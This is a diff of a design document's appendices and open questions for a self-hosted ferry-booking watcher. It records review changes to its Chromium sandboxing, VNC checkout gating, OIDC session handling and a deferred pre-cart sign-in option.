    owner role in home-cluster and a component variant without the initdb secret? **Default:** standard
@@ -2653,6 +2899,12 @@ are in brackets, for readers of earlier versions and of Appendix D rows 1-35.
 11. **Q11 [Q16] Travelling invitees.** The Cloudflare geo-block (CA/US/CN only) also covers
     `auth.chestr.dev`. Add a skip rule for the ferry hosts and `auth.chestr.dev`, or tell invitees?
     **Default: tell invitees.**
+12. **Q12 [Q4] Sandbox and kernel flags (R2).** Having read R2: accept Chromium without its sandbox on
+    `mitigations=off`, `apparmor=0` nodes for now (an exploit reaches that tenant's checkout, and the whole
+    cluster only if chained with a kernel or ferry-control parser bug), with the sandbox hardening (about 4
+    days plus a per-node Talos change) as an optional backlog item? Or make it a gate before non-household
+    invitees (M3 grows by about 4 days)? **Default: accept for now; do the hardening before inviting people
+    you don't know well.**
 
 ---
 
@@ -2668,7 +2920,8 @@ are in brackets, for readers of earlier versions and of Appendix D rows 1-35.
 - Admin or break-glass VNC in the app; tenants seeing any other tenant's data.
 - Cross-tenant search deduplication.
 - An HA multi-replica control plane; an egress gateway or a second egress IP.
-- A "watch my browser" view outside holds, and any pre-cart VNC (owner, round 2: old Q1, "No").
+- A "watch my browser" view outside holds. (Pre-cart VNC for a sign-in is not out of scope for good; it is
+  a deferred option below that needs the owner's explicit decision.)
 - Public sign-up; users outside CA/US/CN (Cloudflare geo-block).
 - The single-container personal mode (owner decision 5); arm64 images (not built today).
 - One browser per *route* shared across dates or users: the unit of watching is a trip (route + date + party),
@@ -2676,16 +2929,25 @@ are in brackets, for readers of earlier versions and of Appendix D rows 1-35.
   tenant's page drive another's alerts (the dedupe problem above).
 - An inactivity pause of trips (removed, §8.1).
 
-**Deferred, possible future options (each reversible, none designed out):**
-- **Attended BC Ferries sign-in before a cart** (the former M5; old Q1, answered "No" in round 2). The user would type their
-  BC Ferries password into the real bcferries.com page in their own pod, during a VNC window of at most
-  10 min, before any cart exists, with cookies in tmpfs only. It would need an exception to decision 3, the
-  sandbox hardening first, spikes S3/S4 [R:billing-guest-mode-credentials "spike plan"], and an origin
-  assertion before typing into `/login` (`site.py:278-301`). The kept login code, `checkout_mode` and the
-  VAP's `optionalEnv` (§5.7) mean it can be added later without undoing anything.
+**Deferred, possible future options (none designed out, each needs the owner's decision):**
+- **Any pre-cart VNC, as an attended BC Ferries sign-in before a cart** (the former M5; old Q1, answered "No"
+  for v1 in round 2). The user would type their BC Ferries password into the real bcferries.com page in their
+  own pod, during a VNC window of at most 10 min, before any cart exists, with cookies in tmpfs only. Adding
+  it undoes nothing (the kept login code, `checkout_mode`, the VAP's `optionalEnv`, the ticket's `aud` and
+  C22's checkout scope, §5.7), but it is real work, about 1.5 weeks (the old M5 estimate):
+  - an exception to decision 3, which means reopening old Q1 with the owner;
+  - a new ticket audience (`fw-vnc-signin`, no `cart_id`) with its own step-2 condition at the gate (§5.5);
+  - C22's sign-in-viewer branch: a pod whose only viewer was a sign-in viewer goes on watching, logged in;
+  - "cart held" in C17's five layers becomes "cart held or sign-in window open", with a sign-in-minutes
+    budget checked when web mints;
+  - an is-logged-in probe, because today login state is set once and never re-checked (`site.py:301`);
+  - the sandbox hardening first (R2), spikes S3/S4 [R:billing-guest-mode-credentials "spike plan"], and an
+    origin assertion before typing into `/login` (`site.py:278-301`).
 - **An account checkout mode** in general, if guest checkout turns out not to work for some fares or at all
-  (§5.7 adjustment path).
-- **The Chromium sandbox and kernel-flag changes** (optional hardening, R2, §12.2 M4).
+  (§5.7 adjustment path). Stored credentials stay excluded (decision 1), so the attended sign-in above is
+  the candidate. A user-requested re-cart of a viewed sailing in a logged-in session would be C22's second
+  named branch.
+- **The Chromium sandbox and kernel-flag changes** (optional hardening, R2, §12.2 M4; Q12).
 
 ---
 
@@ -2700,13 +2962,13 @@ are in brackets, for readers of earlier versions and of Appendix D rows 1-35.
 | D5 | Fat agent: today's Watcher for one trip, owning cart, timers (with the payment guard), back-off, gate and a local bucket, clamped to compiled maxima. It dials out over WS. Protocol §5.3, with no page-control operations. | Holds and VNC gating must survive control-plane outages. A thin RPC agent would put carts on the network path and keep a remote caller one step from page control. |
 | D6 | Projected SA token (audience `ferry-watch-agent`, 600 s), TokenReview with pod-uid and pod-name at connect, binding to the `browser_pods` row written before the pod existed, one socket per uid, every message's trip checked. | Bound tokens die with the pod and are useless against the API server. The binding anchors in a row written by the operator, not in anything the agent asserts. The draft's 5-minute re-review is unnecessary once the fleet loop closes a deleted pod's socket itself. |
 | D7 | Static `ferry-checkout.chestr.dev` route (Cookie and Authorization stripped) → stock-client `vnc-edge` (upgrades only) → pod gate → Xvnc unix socket. web mints a 60 s Ed25519 ticket bound to `sub == FW_OWNER`, trip, pod and `cart_id`, carried in the URL fragment and a subprotocol (via a shim), never in a URL a server sees. First-viewer lock via a client nonce, atomic, with preemption by the lock holder and ping liveness. The alert link is `/c/<trip>`, a device chooser. | The in-pod check must be cryptographic (SNAT). Pods must not serve HTML on a chestr.dev origin. The lock stops a compromised web taking over after the user connects. A unix socket closes the page-JS path by construction. No bundle patch to maintain. |
-| D8 | Guest-only at launch, the owner included (accepted "for now"), assumed to work without a live spike. Production detection, the fleet-wide alert-only switch and per-fare/vehicle alert-only are the adjustment path; the login code (disabled), `checkout_mode` and the VAP's `optionalEnv` keep an account mode possible. No pre-cart sign-in window (old Q1, "No"; a possible future option, §15). Never a dashboard form, a Secret, ESO or a pod-served page. | With no stored credential, no component can leak one. The owner asked for no one-way doors on guest checkout (round 2). |
-| D9 | Cilium `toFQDNs` plus DNS L7 allowlist with `nameError` and fully qualified names (`toCIDRSet` fallback). Kiosk mode and managed policies in 3 directories with fail-closed self-tests. Xvnc on a unix socket only, NeverShared/DisconnectClients=0, `-MaxConnectionTime 6000`, never MaxIdle, MaxDisconnection, IdleTimeout or DLP_KeyRateLimit. PSA restricted, read-only, uid 1001. The Chromium sandbox (Localhost seccomp profile plus the sysctl) and `hostUsers: false` are optional hardening driven by VAP params, the owner's call. | Cilium makes a forward proxy optional. REFUSED breaks search lists. containerd's default seccomp blocks Chromium's namespace sandbox. Unsandboxed Chromium on `mitigations=off` nodes is the largest residual; the owner accepts it for now (round 2, R2), and the params make adding the sandbox a values change. |
+| D8 | Guest-only at launch, the owner included (accepted "for now"), assumed to work without a live spike. Production detection, the fleet-wide alert-only switch and per-fare/vehicle alert-only are the adjustment path; the login code (disabled), `checkout_mode` and the VAP's `optionalEnv` keep an account mode possible. No pre-cart sign-in window in v1 and never as an automatic fallback (old Q1, "No"; a possible future option that needs the owner's decision, §15). The legacy app stays restorable until a guest checkout has worked (§12.5). Never a dashboard form, a Secret, ESO or a pod-served page. | With no stored credential, no component can leak one. The owner asked for no one-way doors on guest checkout (round 2). |
+| D9 | Cilium `toFQDNs` plus DNS L7 allowlist with `nameError` and fully qualified names (`toCIDRSet` fallback). Kiosk mode and managed policies in 3 directories with fail-closed self-tests. Xvnc on a unix socket only, NeverShared/DisconnectClients=0, `-MaxConnectionTime 6000`, never MaxIdle, MaxDisconnection, IdleTimeout or DLP_KeyRateLimit. PSA restricted, read-only, uid 1001. The Chromium sandbox (Localhost seccomp profile plus the sysctl) and `hostUsers: false` are optional hardening driven by VAP params, the owner's call. | Cilium makes a forward proxy optional. REFUSED breaks search lists. containerd's default seccomp blocks Chromium's namespace sandbox. Unsandboxed Chromium on `mitigations=off` nodes is the largest residual (R2); the planner recommends accepting it for now, pending the owner (Q12), and the params make adding the sandbox a values change. |
 | D10 | `min(override ?? default, GitOps ceiling)`. Five enforcement layers. Queued, not Pending. Admin Fleet and Users pages with mandatory reasons and INSERT-only audit plus a log line. No admin VNC. One active browser per user by default. | Ceilings plus compiled maxima mean neither a compromised web nor the operator can make holds or honest polling unbounded. |
 | D11 | Phases Off, Dormant, Waiting, Queued, Starting, Watching, Holding, Draining, BackingOff, NeedsAttention, Past. `restartPolicy: Never`, 26 h deadline, about 24 h recycle. A viewed hold always ends in pod exit, then archive (booked) or "Did you book it?" with auto-resume. SIGTERM drain, no hooks. Bare pods with no anchor and no hold PDB in v1. No inactivity pause. | Fixes today's lost-cart shutdown and "forever" holds. Talos drains bare pods with `Force` and fails upgrades on blocked evictions, so a PDB would fail upgrades and an anchor adds a GC hazard. |
 | D12 | ferry-control's static fair interval stretch (20/min default, 40 ceiling) enforced by the agent bucket with a compiled 30 s floor. Start throttle. Persisted brake and a simple breaker with manual close. Fail-slow. No cross-tenant dedupe. | One residential IP is shared with the household. Agent-side enforcement means no outage or control-plane compromise can speed an honest agent up; a compromised pod can (R13). |
 | D13 | Only web sends, from a Postgres outbox: Web Push by default plus email via smtp-relay; no Pushover. Typed kinds, templates on the server, links only `/c/<trip>` or `search_url`. Ko-fi as a validated plain link. | Owner decisions. Server-side templates stop pods injecting phishing links; the outbox survives restarts. |
-| D14 | **Round 2:** app-native OIDC against Authelia's existing provider (confidential client, Authorization Code + PKCE S256, code in the URL fragment, `id_token` verified by the app), with a cookie-less app session (opaque bearer token in the SPA, hash stored, idle and absolute expiry, server-side revocation, WebSocket first-message auth). The dashboard route has no gateway auth and drops every Cookie header. `IdentityProvider` interface with issuer, client and claims as config; deterministic `uid = hash(iss, sub)` with GitOps aliases; invitations bound at first sign-in; `bootstrapAdmins` plus a DB flag; trusted headers only as a LAN/dev adapter. | The owner asked for OIDC. It fails closed and is testable without the gateway, unlike ext-auth headers or EG's OIDC with `claimToHeaders`. Setting no cookie lets the route drop the owner's Authelia cookie without Lua or a new domain. A deterministic uid lets the pod verify ownership without trusting DB mappings, and survives an IdP swap through aliases. Costs: R17-R19 and 3-4 days. |
+| D14 | **Round 2:** app-native OIDC against Authelia's existing provider (confidential client, Authorization Code + PKCE S256, code in the URL fragment, `id_token` verified by the app), with a cookie-less app session (opaque bearer token in the SPA, hash stored, idle and absolute expiry, re-verification with the IdP every 24 h, server-side revocation, session-bound WebSocket first-message auth). The dashboard route has no gateway auth and drops every Cookie header. `IdentityProvider` interface with issuer, client and claims as config; deterministic `uid = hash(iss, sub)` with GitOps aliases; invitations bound at first sign-in; `bootstrapAdmins` plus a DB flag; trusted headers only as a LAN/dev adapter. | The owner asked for OIDC. It fails closed and is testable without the gateway, unlike ext-auth headers or EG's OIDC with `claimToHeaders`. Setting no cookie lets the route drop the owner's Authelia cookie without Lua or a new domain. A deterministic uid lets the pod verify ownership without trusting DB mappings, and survives an IdP swap through aliases. Costs: R17-R21 and 3-4 days. |
 | D15 | A uv workspace (core, control, agent) with import-linter. Images: control, browser, vnc-edge, plus CI-only agent-e2e and fake-bcferries. A public OCI Helm chart from this repo; cluster-specific bits in home-cluster. Test tiers: unit, Postgres, envtest (VAP matrix, `can-i`), compose integration, kind-lite, home-cluster post-deploy smoke. | Matches the owner's OCI Helm and digest conventions and keeps Playwright out of the control plane. The VAP and RBAC are the isolation, so their negative tests block CI; network behaviour can only be proven on the real cluster, so it gates deploys. |
 | D16 | W0 de-risk spikes (local and cluster only; no live booking spikes), then M1 owner on the new stack, M2 household invitees, M3 wider invitees, M4 hardening backlog (including the optional sandbox). M5 removed. | Each technical unknown decides a design branch before code depends on it; what we don't know about BC Ferries' guest checkout is learned from real use and production detection behind reversible defaults (owner, round 2). Controls that back up RBAC land just before non-household invitees. |
 
@@ -2742,7 +3004,8 @@ are in brackets, for readers of earlier versions and of Appendix D rows 1-35.
 15. **Go controller and CRDs.** Rejected (D2, D4).
 16. **Egress forward proxy.** M4 (for R13), or M3 if S-CIL fails.
 17. **Pushover bring-your-own.** Removed for users.
-18. **Credential-page fallback.** Rejected; alert-only. The pre-cart window was declined (old Q1, round 2).
+18. **Credential-page fallback.** Rejected; alert-only. The pre-cart window was declined for v1 and is never
+    an automatic fallback (old Q1, round 2); it needs an explicit owner decision (§15).
 19. **Cookie on the dashboard host.** The draft used a Lua filter. **Review: trusted headers let the route drop
     the whole Cookie header after ext-auth**; Lua is off by default and gateway-wide. **Round 2:** with OIDC,
     the app sets no cookie (a bearer session), so the route still drops the whole Cookie header.
@@ -2777,17 +3040,17 @@ are in brackets, for readers of earlier versions and of Appendix D rows 1-35.
 | Loopback Xvnc reachable by page JS (A, B) | C13 (unix socket only), §5.6 self-tests 2-3, LNA policy, S-KIOSK |
 | Bearer ticket, undefined reconnect (A) | §5.5: `sub == FW_OWNER`, nonce lock with atomic set and preemption, no URL reuse; Q1, Q1b |
 | Hub inside the internet-facing process (A) | D1: the hub endpoint lives in `ferry-control`, not `ferry-web` |
-| Kernel args and `--no-sandbox` (A) | R2 (explained in plain terms, contained per session); S-SBX (seccomp profile + sysctl) as optional hardening, the owner's call (round 2); not a gate |
+| Kernel args and `--no-sandbox` (A) | R2 (explained in plain terms, including what a chained kernel or parser bug reaches); S-SBX (seccomp profile + sysctl) recommended as optional hardening, not a gate, pending the owner (Q12) |
 | SNAT makes NetworkPolicy unprovable (A, B) | §2.2, C6, cryptographic gate, vnc-edge hop, S-CIL decides entity rules |
 | Hold-cap clock starts when the operator first sees it (A) | §3.6 step 2: `hold_ready_at` at ack; compiled 90-min cap; `-MaxConnectionTime` |
 | VAP `system:` exemption (A) | §7.5 `fw-browser-pod-lock` (named exemptions, positives in kind-lite), M3 |
-| Credential-page fallback (A, B) | §5.7: alert-only; no pre-cart window (old Q1, round 2) |
+| Credential-page fallback (A, B) | §5.7: alert-only; no pre-cart window in v1 (old Q1, round 2) |
 | One DB role for every process (A) | §6.4 two login roles via CNPG managed roles, RLS, trigger; S-DB |
 | Authelia client restrictions before outsiders (A) | §6.2.9, §2.3, M2 hard gate |
 | Tickets in URLs reach logs (A, B) | C15 fragment plus subprotocol via shim; nginx `noargs`; Appendix B #6 |
 | `empty_cart` unverified; guest checkout unverified (A) | §5.2: the landing-URL check now, the empty-cart check from the M1 fixtures, every release counted by check level. Guest checkout assumed (owner, round 2: no spike), with production detection, the alert-only switch and two-way doors (§5.7). |
 | Align with cluster facts (B) | §2.2 |
-| No pre-cart VNC under any fallback (B) | §5.7 |
+| No pre-cart VNC as a fallback (B) | §5.7: not in v1 and never automatic; only by an explicit owner decision (§15) |
 | Shutdown loses carts (B) | §5.1 supervisor, `tini --`, verified drain |
 | Pod template and VAP written together (B) | §7.4-7.5, §11.4 leak matrix, §11.5 |
 | Policies in three directories; never RemoteDebugging or DevTools policies (B) | §5.6; image smoke test |
@@ -2801,7 +3064,8 @@ are in brackets, for readers of earlier versions and of Appendix D rows 1-35.
 ## Appendix D: Changes from review
 
 Rows 1-35 record the review of the draft and use the question numbers of that time (Q0-Q16); §14 maps them
-to today's numbers. Rows 36-47 record the owner's round-2 answers.
+to today's numbers. Rows 36-47 record the owner's round-2 answers. Rows 48-60 record the fixes from three
+independent reviews of the round-2 revision (consistency, OIDC security, one-way doors).
 
 | # | Change | Why (reviewer) |
 |---|---|---|
@@ -2856,10 +3120,23 @@ recorded in [decisions.md](decisions.md), in the old numbering: (1) Q3/Q3b, (2) 
 | 38 | Alternatives kept in §6.2.5: trusted headers via ext-auth, and Envoy Gateway's OIDC SecurityPolicy with `jwt.claimToHeaders`, both rejected because they are header trust that fails open if the gateway policy is detached; app-native OIDC fails closed and is testable without the gateway. `TrustedHeaderProvider` kept only as a LAN/dev adapter that the chart refuses to combine with the envoy-external route. | (2) |
 | 39 | Guest checkout assumed, with no live spikes: S1, S2, S2b, S5, S6, S7 and the live part of S-FIX removed from W0 and the critical path; fixtures captured from the owner's real use during M1; production detection (`checkout_login_seen`, expired carts, "Did you book it?" reasons, outcome, release and duration metrics, the `guest_checkout_failing` alert); hold clocks keep 30/30/10/60 min and are tuned from telemetry; payment hosts seeded with Moneris and learned from real checkouts; S-3DS no longer completes test bookings. | (1) and (5) "No spike for now, assume it works" |
 | 40 | Two-way doors listed in §5.7: the login code kept behind a disabled flag; `checkout_mode` reserved in `trips` and `configure`; the fleet-wide and per-fare/vehicle alert-only switches; the VAP's `optionalEnv` param can admit `FW_CHECKOUT_MODE`. `empty_cart` checks the landing URL now and the empty cart once fixtures exist; `bye.empty_verified` became `release_check`. | (5) "don't make any one way door decisions on this" |
-| 41 | "Users can always sign-in on the browser?" answered in §5.7: they may (bcferries.com, including `/login`, is allowlisted; nothing persists), but signing in can drop the held cart (README.md "Things to know about BC Ferries"; `site.py:288-290`), so the plan doesn't rely on it and `/c/<trip>`, the cart banner and the invite email say so. | (1) |
+| 41 | "Users can always sign-in on the browser?" answered in §5.7 (corrected in row 50): bcferries.com, including `/login`, is allowlisted, but BC Ferries has refused logins while a guest cart exists ([top-level README](../../README.md) "Things to know about BC Ferries"; `site.py:288-290`), so the plan doesn't rely on it and `/c/<trip>`, the cart banner and the invite email say so. | (1) |
 | 42 | The sandbox and kernel flags explained in plain terms (R2). Changed from a gate before non-household invitees to optional hardening in the backlog (M4), the owner's call, recommended before inviting people the owner doesn't know well. Removed from §12.4, from W0 (S-SBX to the backlog), from the M3 deliverables and from the home-cluster checklist; the VAP params that can require it later stay. | (3) "I don't understand this limitation why is it needed." |
 | 43 | No pre-cart sign-in window: VNC stays strictly gated to a held cart; M5 removed from the milestones and listed as a possible, reversible future option in §15. | (4) "No" |
 | 44 | Milestones and effort recomputed: W0 6.5-8 days (about 1.5 weeks), M1 62-76 (OIDC +3-4, detection and fixtures +2-3), M2 unchanged, M3 6.5-10 (kept as its own audience step, reasons in §12.2), total 89-112 days ≈ 18-22.5 weeks, owner on the new stack after about 14-17. M1's exit no longer needs a booking made only to test. | Follows from 36-43 |
 | 45 | Open questions: the answered ones (old Q0-Q4, Q6) listed in §14.1; the rest renumbered Q1-Q11 with their old numbers in brackets, and every in-text reference updated. | Housekeeping |
 | 46 | Data model and API for the above: `invites`, `sessions`, `identities (iss, sub)`, `trips.checkout_mode`; `/auth/config`, `/auth/session`, `/auth/logout`, `/api/me/sessions`, admin invites and session revocation; the "booked" answer's `reason`. | Follows from 36-41 |
 | 47 | The checkout host is `ferry-checkout.chestr.dev` instead of `ferry-vnc.chestr.dev` everywhere (route, `FW_VNC_ORIGIN`, CSP, shim regex, links). Still a single label under `chestr.dev`, so the certificate and the tunnel rule cover it; internal names (`vnc-edge`, `FW_VNC_*`) stay. | Owner, round 2 ([decisions.md](decisions.md)) |
+| 48 | The spike claims made accurate: no spike tests guest checkout and no booking is made only to test, but S-MEM reads real pages, S-DRAIN and the M1 VNC exit check briefly hold one real cart and release it, and S-3DS's walks to the 3DS step need the owner's OK (Q8). S-MEM's checkout measurement moved to M1, from the owner's real holds. | Consistency: "none holds BC Ferries inventory" was untrue. |
+| 49 | The sandbox and kernel outcome relabelled as the planner's recommendation, pending the owner: Q12 added (default: accept for now; harden before inviting people the owner doesn't know well). The optional hardening costed at about 4 days (S-SBX about 1 plus about 3) everywhere. | Consistency: the owner only asked why it was needed (decisions.md records a recommendation). |
+| 50 | The in-browser sign-in answer rewritten: probably not during checkout, because every VNC session has a held guest cart and BC Ferries has refused logins while one exists; whether trying affects the cart is unverified; and advised against for security too (the password would cross the R4 path into an unsandboxed Chromium, and the account session outlives the pod). New copy: "Check out as a guest. Don't sign in to BC Ferries here: it doesn't accept a sign-in while a cart is held." C1's threat narrowed to *stored* credentials; R4 and the secrets table name the typed-password case; blocking `/login` documented as a one-line option. | Consistency (the answer didn't follow from the evidence); OIDC security (it invited a password into the VNC path and conflicted with §15's "sandbox first"). |
+| 51 | `checkout_login_seen` gains `forced` (site redirect or account-required page vs a user-started visit) and the "I tried to sign in" reason; only forced walls and `needed_account` answers count. `guest_checkout_failing` now fires on the first one (the 2-in-7-days PrometheusRule stays). A per-hold outcome record (outcome, reason, fare, vehicle type, login seen) kept 400 days. | Consistency (voluntary sign-ins would raise false alerts); one-way doors (the signal could stay silent at household volume, and per-type evidence expired after 30 days). |
+| 52 | Sessions re-verified with the IdP at least every 24 h (silent redirect, token rotated, groups re-read); R20 (IdP removal is not immediate) and a "Removing a person" runbook (suspend in the app first). | OIDC security: Authelia applies the client policy only at the authorize endpoint (`handler_oauth2_authorization_consent_core.go:35-80`), so a removed person kept access for up to 30 days. |
+| 53 | R2 rewritten: the exploit window is the pod's whole life; containment holds only while ferry-control's parser and the kernel hold; every node is a control-plane node (`talos/controlplane.yaml:191`), so a kernel escape is the whole cluster; `mitigations=off` matters most once native code runs. §13's R2 row and the README follow. | OIDC security: the plain-language R2 understated the risk the owner is asked to accept. |
+| 54 | Authelia's `sub` stated as per username (`internal/oidc/store.go:76-101`); R21; "never reuse an lldap username"; email-change flag. The uid is always computed (`identityAliases.get(hash(iss, sub))`), the `identities` row is only a cache, and a mismatch refuses the sign-in (C23); aliases take precedence over `bootstrapAdmins`. | OIDC security; one-way doors. |
+| 55 | Dashboard WebSocket: `/api/ws` exempt from the header middleware (first-message auth mandatory), sockets bound to their session's `token_hash` and closed on its revocation or expiry, 4 KiB message cap. No automatic sign-in after an explicit sign-out (a "signed out" flag), and only `expired`/`reverify` 401s restart sign-in. | OIDC security. |
+| 56 | R17 corrected: the CSP stops injection and fetch/form exfiltration, not navigation; the stolen-token window is now bounded by the 24 h re-verification. R12 states that script on the ferry host can still make same-site requests carrying the owner's `SameSite=Lax` Authelia cookie (`schema/session.go:30,89`); old Q6 is "mostly moot", not moot. Pre-auth limits keyed per client (`CF-Connecting-IP`) with a global backstop. `alg` allowlist with `none`/HS256 tests; provider binding before multi-provider; §2.3's "useless without the client secret" corrected. | OIDC security; consistency. |
+| 57 | S-IOS also backgrounds the home-screen app during the Authelia steps (Mail for the enrolment code, authenticator, passkey); fallbacks: a 10-minute localStorage pending sign-in, first enrolment in Safari or on a computer, the handoff code. | OIDC security. |
+| 58 | The legacy app, its PVC and `BCF_USER`/`BCF_PASS` are deleted only after 14 days **and** a real guest checkout on the new stack with no forced login wall since; the revert PR pins the legacy image by digest; an envoy-internal host is noted for running it alongside. | One-way doors: a fixed 14 days could delete the only logged-in checkout path before guest checkout was proven. |
+| 59 | Pre-cart VNC moved from "out of scope" to a deferred option that needs the owner's decision ("not in v1, never an automatic fallback" replaces "under any fallback"); the attended sign-in named as the account-mode candidate; the "no redesign" claims replaced by the actual list (ticket audience, C22 branch, C17 layers with a sign-in-minutes budget, an is-logged-in probe, the sandbox first; about 1.5 weeks). Cheap now: the ticket's `aud` names its purpose, `vnc_mints.cart_id` is nullable, C22 is scoped to checkout viewers. | One-way doors; consistency. |
+| 60 | Door 1 kept alive in CI (the login and back-off tests ported with the flag forced on; fake-bcferries keeps `/login` and `/my-account`). The header adapter's principal defined (`iss` from config, `sub` = `Remote-User`; one alias per user to switch); unmatched sign-ins recorded for 30 days; the dashboard route also strips `Remote-*`; separate `routes.dashboard.enabled` and `routes.checkout.enabled` flags so the LAN adapter can coexist with checkout. Minor fixes: the user-agent question reference (Q4), "Q8-Q10 and Q12 before M3" in both documents, identical minimum-secure-v1 lists, the top-level README citation. Effort: M1 63-77 days, total 90-113 (about 1 day for these fixes). | One-way doors; consistency. |
